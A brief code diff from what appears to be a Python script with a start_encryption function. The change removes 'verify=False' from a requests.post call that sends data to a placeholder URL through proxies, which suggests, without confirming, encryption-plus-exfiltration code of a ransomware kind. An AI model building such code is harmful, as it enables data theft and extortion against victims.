@@ -342,7 +342,7 @@ def start_encryption():
         } # Replace with your proxy if needed
 
         try:
-            requests.post(YOUR_URL, data=data, proxies=proxies, verify=False, timeout=30)
+            requests.post(YOUR_URL, data=data, proxies=proxies, timeout=30)
         except requests.exceptions.RequestException as e:
             print(f"Error sending data: {e}")
 
